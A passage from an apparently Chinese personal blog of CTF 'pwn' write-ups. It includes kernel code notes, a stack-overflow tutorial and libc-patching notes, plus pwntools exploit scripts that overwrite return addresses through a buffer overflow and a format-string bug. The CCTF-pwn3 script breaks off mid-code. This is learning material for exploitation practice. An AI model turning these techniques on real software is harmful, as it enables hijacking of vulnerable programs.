title="__mutex_trylock()"></a>__mutex_trylock()</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Optimistic trylock that only works in the uncontended case. Make sure to</span><br><span class="hljs-comment"> * follow with a __mutex_trylock() before failing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> __mutex_trylock_fast(<span class="hljs-keyword">struct</span> mutex *lock)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> curr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)current;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> zero = <span class="hljs-number">0UL</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">atomic_long_try_cmpxchg_acquire</span>(&amp;lock-&gt;owner, &amp;zero, curr))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutex-lock-slowpath"><a href="#mutex-lock-slowpath" class="headerlink" title="__mutex_lock_slowpath()"></a>__mutex_lock_slowpath()</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs applescript">static void __sched __mutex_lock_slowpath(struct mutex *lock);<br><br>/**<br> * mutex_lock - acquire <span class="hljs-keyword">the</span> mutex<br> * @lock: <span class="hljs-keyword">the</span> mutex <span class="hljs-keyword">to</span> be acquired<br> *<br> * Lock <span class="hljs-keyword">the</span> mutex exclusively <span class="hljs-keyword">for</span> this task. If <span class="hljs-keyword">the</span> mutex <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span><br> * available right now, <span class="hljs-keyword">it</span> will sleep <span class="hljs-keyword">until</span> <span class="hljs-keyword">it</span> can <span class="hljs-keyword">get</span> <span class="hljs-keyword">it</span>.<br> *<br> * The mutex must later <span class="hljs-keyword">on</span> be released <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> same task <span class="hljs-keyword">that</span><br> * acquired <span class="hljs-keyword">it</span>. Recursive locking <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> allowed. The task<br> * may <span class="hljs-keyword">not</span> <span class="hljs-keyword">exit</span> <span class="hljs-keyword">without</span> <span class="hljs-keyword">first</span> unlocking <span class="hljs-keyword">the</span> mutex. Also, kernel<br> * memory <span class="hljs-keyword">where</span> <span class="hljs-keyword">the</span> mutex resides must <span class="hljs-keyword">not</span> be freed <span class="hljs-keyword">with</span><br> * <span class="hljs-keyword">the</span> mutex still locked. The mutex must <span class="hljs-keyword">first</span> be initialized<br> * (<span class="hljs-keyword">or</span> statically defined) <span class="hljs-keyword">before</span> <span class="hljs-keyword">it</span> can be locked. memset()-ing<br> * <span class="hljs-keyword">the</span> mutex <span class="hljs-keyword">to</span> <span class="hljs-number">0</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> allowed.<br> *<br> * (The CONFIG_DEBUG_MUTEXES .config option turns <span class="hljs-keyword">on</span> debugging<br> * checks <span class="hljs-keyword">that</span> will enforce <span class="hljs-keyword">the</span> restrictions <span class="hljs-keyword">and</span> will also do<br> * deadlock debugging)<br> *<br> * This function <span class="hljs-keyword">is</span> similar <span class="hljs-keyword">to</span> (<span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> equivalent <span class="hljs-keyword">to</span>) down().<br> */<br></code></pre></td></tr></table></figure><h3 id="kernel-restart"><a href="#kernel-restart" class="headerlink" title="kernel_restart()"></a>kernel_restart()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kernel_restart</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmd)</span><br>&#123;<br>kernel_restart_prepare(cmd);<br>migrate_to_reboot_cpu();<br>syscore_shutdown();<br><span class="hljs-keyword">if</span> (!cmd)<br>pr_emerg(<span class="hljs-string">&quot;Restarting system\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>pr_emerg(<span class="hljs-string">&quot;Restarting system with command &#x27;%s&#x27;\n&quot;</span>, cmd);<br>kmsg_dump(KMSG_DUMP_RESTART);<br>machine_restart(cmd);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//security_capable函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">security_capable</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> user_namespace *ns,</span><br><span class="hljs-params">     <span class="hljs-type">int</span> cap,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> opts)</span><br>&#123;<br><span class="hljs-keyword">return</span> call_int_hook(capable, <span class="hljs-number">0</span>, cred, ns, cap, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUG()do &#123;\</span><br><span class="hljs-meta">pr_warn(<span class="hljs-string">&quot;BUG: failure at %s:%d/%s()!\n&quot;</span>, __FILE__, __LINE__, __func__); \</span><br><span class="hljs-meta">barrier_before_unreachable();\</span><br><span class="hljs-meta">__builtin_trap();\</span><br><span class="hljs-meta">&#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pr_crit(fmt, ...) \</span><br><span class="hljs-meta">printk(KERN_CRIT pr_fmt(fmt), ##__VA_ARGS__)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cap_valid(x) ((x) &gt;= 0 &amp;&amp; (x) &lt;= CAP_LAST_CAP)</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** </span><br><span class="hljs-comment">* emergency_restart - 重启系统</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* 不关闭任何硬件或获取任何锁</span><br><span class="hljs-comment">* 重启系统。当我们知道我们有</span><br><span class="hljs-comment">麻烦时调用它，所以这是我们重启的最大努力。</span><br><span class="hljs-comment">* 在中断上下文中调用</span><br><span class="hljs-comment">它是安全的。*/</span> <br><span class="hljs-type">void</span>  <span class="hljs-title function_">emergency_restart</span> <span class="hljs-params">( <span class="hljs-type">void</span> )</span> <br>&#123; <br>kmsg_dump ( KMSG_DUMP_EMERG ); <br>machine_emergency_restart (); <br>&#125; <br>EXPORT_SYMBOL_GPL ( emergency_restart );<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令行使用相关</title>
    <link href="/2022/08/25/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/08/25/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>命令行配置文件</p><p>notepad $profile</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>StackOverflow</title>
    <link href="/2022/07/09/StackOverflow/"/>
    <url>/2022/07/09/StackOverflow/</url>
    
    <content type="html"><![CDATA[<p>​前段时间给CWL写了一个简单推文，存一下。</p><h1 id="Stack-Overflow—栈溢出"><a href="#Stack-Overflow—栈溢出" class="headerlink" title="Stack Overflow—栈溢出"></a>Stack Overflow—栈溢出</h1><p>​你听说过栈溢出吗？如果没有，或许你在编程入门时一定遇到过段错误（Segment Fault），栈溢出是程序漏洞的入门级漏洞，编程初学者很容易在使用c、c++误用带有栈溢出漏洞的函数、进而造成错误的内存访问，这是出现段错误的其中一个原因。</p><p>​栈是一种先进后出（LIFO）的数据结构，其在程序函数调用过程和程序运行过程中广泛应用，每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。下面将以linux下x86系统为例，分析栈溢出的成因。</p><p>​在学习栈溢出前，我们需要了解一下函数调用栈的相关知识。</p><p>​在C语言程序中，函数调用经常是嵌套的，但机器寄存器的数量是有限的，假设我们在函数A中调用函数B，我们需要将A的参数信息保存下来，从而使程序执行函数B的代码，这个保存的方式就是栈帧：在同一个时间，每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)，栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p><img src="/1.png"></p><p>​当程序调用一个新函数时，会建立一个栈帧，依次进行以下步骤：将寄存器数据压入栈中→将函数参数压入栈中→将该函数结束的下一条语句的地址压入栈中(返回地址)→将原函数的栈帧基址压入栈中→进行函数本身的栈利用操作</p><p>​当该新函数运行结束时，会依次弹出该栈帧的数据，通过EBP将栈基址恢复为上一层函数的栈基址，程序再跳到返回地址指向的代码处继续运行。</p><p>​在此过程中，最关键的部分在于【返回地址】，如果我们使用某些操作将返回地址修改掉，那么在函数结束返回原函数时会失败，进而跳转到被修改的地址上，这就属于其中一种最入门的栈溢出漏洞。</p><p>​那么栈溢出漏洞利用的原理就很明显了：利用栈中数据的溢出篡改程序进程，进而劫持程序或破坏程序。</p><p>​接下来将以一个基础例子(Buuctf—jarvisoj_level0)来描述利用read函数的劫持过程。</p><p>​read函数说明：read(int fd, void * buf, size_t count)会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. </p><p>​若该程序定义的输入字节数大于buf指向的内存空间，程序也将照样执行，我们将可以借此修改栈帧中的返回地址。</p><p>​使用反汇编程序ida查看题目所给的可执行文件</p><p>​main函数：</p><p><img src="/2.png"></p><p>​进入vulnerable_function()</p><p><img src="/3.png"></p><p>​发现存在read函数，buf长度128，却能读入0x200个字节，我们回顾一下栈帧的压入过程</p><p><img src="/4.png" alt="image-20220521235503738"></p><p>​由于栈是由高地址向低地址生长，当往buf中存入0x200字节内容时，溢出的内容会覆盖至后面的返回地址上，因此我们可以借此修改返回地址，实现改变程序结束该函数后运行的代码地址。</p><p>​继续查看反汇编代码，发现有一个后门函数（可直接劫持程序的函数，往往叫systemcall，后门函数常出现于安全类赛事中，用于程序漏洞利用的考察）</p><p><img src="/5.png" alt="image-20220521235743316"></p><p>​查看该后门函数的地址并记录</p><p><img src="/6.png" alt="image-20220521235926677"></p><p>​因此，我们现在需要做的事情就非常明确了：输入大于128字节的数据，覆盖栈中存储返回地址的空间，修改为我们需要程序运行的函数的地址，此处为0x400596，使程序在read函数结束后跳转到后门函数中，实现程序劫持。</p><p>​使用python写一个小的脚本实现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">from pwn import *<br>sh=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,***)<span class="hljs-regexp">//</span>连接题库<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0</span>x400596)<span class="hljs-regexp">//</span>输入<span class="hljs-number">128</span>+<span class="hljs-number">8</span>个无用数据覆盖前面的空间，再存入后门函数的地址<br>sh.send(payload)<span class="hljs-regexp">//</span>发送数据<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>​这只是体现栈溢出原理的一个很基础的例子，常用的存在该类型溢出的函数还有gets()等，实际利用中，常常搭配ROP链(利用程序中已有的汇编代码片段进行组合成为攻击代码链，以此劫持程序)、shellocode(往可执行栈堆中注入攻击代码，利用栈溢出跳转执行攻击代码实现劫持)等实现程序劫持，若想更深入地了解，可以访问ctf wiki进行进一步的学习。</p><p>​关于栈溢出的防范，还有一些应对栈溢出的方法，如NX栈堆不可执行保护(防范shellcode)、canary(在栈中使用标志位，通过标记数字是否被篡改判断是否产生栈溢出)、ASLR地址随机化(使攻击者无法直接注入静态地址)，但这些方式都可以通过一定的方式进行绕过，因此最有效的方法即慎用甚至不用危险函数。</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用patchelf修改程序依赖的libc库</title>
    <link href="/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/"/>
    <url>/2021/09/27/%E4%BD%BF%E7%94%A8patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>一开始并不了解需要更改程序libc库使之与本机适配，在b00ks那题耽误了非常多时间，这里记录一下修改libc过程中学到的一些东西和过程。</p><p>0.首先需要理解好关于动态链接依赖库的认识<a href="https://zhuanlan.zhihu.com/p/59590848%E3%80%81%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E3%80%8B%E7%AC%AC%E5%85%AB%E7%AB%A0%E3%80%82">https://zhuanlan.zhihu.com/p/59590848、《程序员的自我修养》第八章。</a></p><p>1.为什么要修改libc库</p><p><img src="/1.png"></p><p>这里的libc.so.6是一个软连接，表示该程序依赖于libc.so.2.x.x版本的libc，后面的路径指向本地该版本libc的地址，ld则是链接器的地址，但由于本地使用的libc与靶机libc版本不一样，导致脚本在不同系统上运行时会造成某些地址变化，然后出错，因此需要下载一个与靶机相同的libc版本，使该程序的软链接指向适配靶机的libc版本，这样在本地调试与远程调试时才能有正确的结果。</p><p>2、应该修改为什么libc版本</p><p>修改为靶机使用的libc版本，或题目给出的libc文件版本。</p><p>3、操作</p><p>①本题在buuctf上进行，题目原文件并没有给出libc版本，而在buuctf上使用的靶机为ubuntu16，对应使用的libc文件可在网站上下载，查看libc文件的版本号，由于有libc版本还不够，还需要相对应的ld进行动态链接，因此需要通过libc-all-in-one来下载该libc版本对应的ld。</p><p><img src="/2.png"></p><p>②安装glibc-all-in-one </p><p>直接看README就ok，这里主要记录一下这个报错和解决方法</p><p><img src="/3.png"></p><p>直接update失败，报错说不支持py2，用py3运行一下就ok。</p><p>③cat list查看所有版本号</p><p><img src="/4.png"></p><p>找到相同的版本号，这里的amd64是64位系统用的，i386是32位系统用的，根据系统的位数来选。</p><p>下载</p><p><img src="/5.png"></p><p>在该文件夹中就能找到这个版本的所有文件，将其中的ld复制到题目所在文件夹下。</p><p>④安装patchelf 可以直接apt install patchelf</p><p>⑤使用patchelf</p><p><img src="/6.png"></p><p>ldd可以查看程序原本依赖的库地址</p><p>更改程序libc与ld版本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">patchelf <span class="hljs-params">--set-interpreter</span> <span class="hljs-string">./ld-2.23.so</span> <span class="hljs-string">./b00ks</span> <br>patchelf <span class="hljs-params">--replace-needed</span> libc.so.6 <span class="hljs-string">./libc-2.23.so</span> <span class="hljs-string">./b00ks</span><br>                          旧版本      新版本<br></code></pre></td></tr></table></figure><p>新的路径</p><p><img src="/8.png"></p><p>参考资料：</p><p><a href="https://blog.csdn.net/huzai9527/article/details/118558784">https://blog.csdn.net/huzai9527/article/details/118558784</a></p><p><a href="https://lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">https://lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/</a></p>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>b00ks</title>
    <link href="/2021/08/31/b00ks/"/>
    <url>/2021/08/31/b00ks/</url>
    
    <content type="html"><![CDATA[<p>这道题是我在接触堆以后学习的第一道题，先大概看了一遍wiki里面堆和ptmalloc的前置知识，其实吸收得不是很好，做题的时候遇到了很多基础性的问题，所以看题解和自己调试花了非常多时间，我会把一些我解决的非常基础的问题也记录下来。</p><hr><p>这题做到一半发现偏移地址不太对，才知道堆题大多数都需要更换程序链接的libc，因为不太了解libc链接机制，顺便又把《程序员的自我修养》后面几章给看完了。这题在wiki上没有提供libc版本，又因为我对patchelf原理不太熟悉，导致我在这里卡了很久，后面是到buuctf上打，有提供libc版本。</p><p>在我的另一篇博客记录了更换libc的过程</p><hr><p>首先是应该看ida，都知道漏洞是出在自定义read函数上，它这里多输入了一个数，且自增后将指针指向的值修改为0，这就是溢出了单字节。</p><p><img src="/1.png"></p><p>然后是create book的数据结构，是在这一段</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3 = malloc(0x20u<span class="hljs-class">LL);</span><br>         <span class="hljs-built_in"> if </span>( v3 )<br>          &#123;<br>            *((_DWORD *)v3 + 6) = v1;//==*((_QWORD *)v3 + 3) = v1;<br>            //des_size<br>            *((_QWORD *)off_202010 + v2) = v3;//把book指针放到author_name后或前一个book后<br>            *((_QWORD *)v3 + 2) = v5;//des_ptr<br>            *((_QWORD *)v3 + 1) = ptr;//name_ptr<br>            *(_DWORD *)v3 = ++unk_202024;//id<br>           <span class="hljs-built_in"> return </span>0<span class="hljs-class">LL;</span><br>          &#125;<br></code></pre></td></tr></table></figure><p>那么我们用gdb一步一步调试分析利用</p><p>1、由于第一步操作是输入author_name，所以这里溢出的单字节会被后面放入的指针覆盖，所以随便写点就可以，这里写入‘A’*32。</p><p>2、create两个book，并且第二个book分配较大内存以便后续利用（如0x21000），查看内存分析结构，这里开启了PIE，所以关闭一下ASLR，这样会同时使PIE无法启用，调试更方便。</p><p><img src="/2.png" alt="用search找到author name的位置"></p><p>查看author name地址中的内容</p><p><img src="/3.png"></p><p>这里的book由于是不确定的空间大小，根据c语言的结构体，这里会分配一个指向book内存的指针放在这个结构内，也是上面*((_QWORD *)off_202010 + v2) &#x3D; v3;的结果，因此这里是指向book1内存的指针，然后进入这个指针观察。</p><p><img src="/4.png"></p><p>那么回到author name的内存，因为后面紧跟着book1 ptr，因此溢出的单字节可以对book1 ptr进行修改，由于小端序，会将最后两位修改为00，这时候我们修改一下author_name，就可以覆盖book1的最后一位，修改后的地址刚好在book1_des的内容里面，就可以在book1_des里伪造一个fake_chunk，由于ASLR，每次运行程序的地址都不一样，我们在fake_chunk里放入当下book2的内容地址并且泄露出来，就可以计算出根据libc和mmap分配内存的固定偏移，这样在重新运行的时候就能根据固定偏移算出libcbase，从而修改free_hook为system函数。</p><p><img src="/6.png"></p><p>注意这里我写入了payload&#x3D;p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)以后发现它有些移位，这是book1大小不同导致的，所以前面要填充一部分deadbeef使fake_chunk刚好在这个指针指向的内存上，而这也是book1不能设置太大的原因，否则单字节覆盖后的指针不一定会指向book1_des内的空间。</p><p><img src="/5.png"></p><p>这里看到libc_base是0x7fddf35b2000，而输出book1_name得到的内容是book2_name_ptr，输出book1_des得到的内容是book2_des_ptr，这里的book2_des_ptr为0x00007fddf356e010</p><p>到这里遇到了一点问题不能继续，我会在查阅资料后完善这篇文章。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnme_k0</title>
    <link href="/2021/08/13/pwnme-k0/"/>
    <url>/2021/08/13/pwnme-k0/</url>
    
    <content type="html"><![CDATA[<p>先分析下程序和保护，开了RELRO，不能改got地址</p><p><img src="/1.png"></p><p>分析程序，发现第一个register只要第一位不为48就可以跳过。</p><p>跳过以后发现漏洞主要在Show命令里的两个printf，格式化字符串漏洞。且程序中含有system（）函数。</p><p><img src="/2.png"></p><p>那么我们的思路就是：先edit，输入两个格式化字符串泄露栈中存储返回地址的地址，再修改内容为system（）函数的地址，这样函数返回时就会调用system（）。</p><p>接下来是我主要的分析和学习的知识点：</p><p><img src="/4.png"></p><p><img src="/3.png"></p><p>找了一些资料解决我对偏移、指针一类的疑惑，我大概是如上图这样理解的。</p><p>0x400D74是show函数运行完后跳转的地址，因此它相对于show函数的帧顶的偏移是不变的，我们可以直接泄露出存储该返回地址的地址，即上图0x…dd08，利用%n修改0x…dd08地址中的值。</p><p>1、确定格式化字符串的偏移</p><p>64位系统中，函数前六个参数在寄存器中，则printf的第一个参数为格式化字符串，往后则是格式化字符串的参数，前五个均在寄存器中，然后从栈开始数。这里要注意的是，上图第一行为栈指针，而第二行为printf函数的帧顶，函数的参数应该在自己所在帧中提取，即第2、3、4行则是格式化字符串的第6、7、8个参数，所以格式化本身的偏移为8。</p><p>2、为什么不直接%2214d%7$hn?</p><p>%n的作用为，把已经成功输出的字符个数写入对应的整型指针参数所指的变量。那么在这里，整型指针指该栈地址，变量地址则为0x400d74，写入变量就变成了修改地址0x400d74所指向的内容，而不是修改0x400d74这个地址本身了。</p><p>先将ret_addr泄露，写入栈中的位置，此时变量则为储存返回地址的空间，再利用%n就可以改变该空间内的值从而修改返回地址。</p><p>3、为什么不能直接往username中输入p64（ret）+b‘%2214d%8$hn’</p><p>我不知道，想不明白，以后学到更多的时候再回来想想。</p><p>exp</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs dart">from pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;11111&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;11111&#x27;</span>)<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;%6<span class="hljs-subst">$p</span>&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;111&#x27;</span>)<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>ret=<span class="hljs-built_in">int</span>(p.recvline().strip(),<span class="hljs-number">16</span>)<span class="hljs-number">-0x38</span><br>success(<span class="hljs-string">&quot;ret_addr:&quot;</span>+hex(ret))<br>p.recv()<br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recv()<br>p.sendline(p64(ret))<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;%2218d%8<span class="hljs-subst">$hn</span>&#x27;</span>)<br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CCTF-pwn3</title>
    <link href="/2021/07/26/CCTF-pwn3/"/>
    <url>/2021/07/26/CCTF-pwn3/</url>
    
    <content type="html"><![CDATA[<p>先checksec</p><p><img src="/1.png"></p><p>看ida的第一步，首先应该输入正确的usrname，这里需要对输入的每一个字母的ascii码都加一，然后与sysbdmin进行strcmp，因此，我们输入的字符串应该是rxraclhm。</p><p><img src="/2.png"></p><p>这里dest就被存入了sysbdmin的内容。</p><p>接下来是输入命令，这份博客把各函数内容说得很详细了<a href="https://www.cnblogs.com/yuren123/p/12748559.html%EF%BC%8C%E6%88%91%E4%BB%AC%E9%9B%86%E4%B8%AD%E5%85%B3%E6%B3%A8get_file%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84fmtstr%E6%BC%8F%E6%B4%9E">https://www.cnblogs.com/yuren123/p/12748559.html，我们集中关注get_file函数中的fmtstr漏洞</a></p><p><img src="/4.png"></p><p>通过对其他函数的分析，程序通过指针实现存储文件的功能，每个文件的文件头大小为40，文件内容大小为200，在get_file函数中，输入需要打印的文件的文件名，将文件内容复制至dest指针指向的空间并直接printf，基本思路是将payload通过put_file输入其中一个文件中，然后使用get_file函数利用fmtstr进行利用。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>//通过第一道认证<br>p.recvuntil(<span class="hljs-string">&#x27;nism):&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;rxraclhm&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_file</span>(<span class="hljs-params">name,content</span>):<br>    p.sendline(<span class="hljs-string">&quot;put&quot;</span>)<br>    p.recv()<br>    p.sendline(name)<br>    p.recv()<br>    p.sendline(content)<br>    p.recv()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output_file</span>(<span class="hljs-params">name</span>):<br>    p.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>    p.recv()<br>    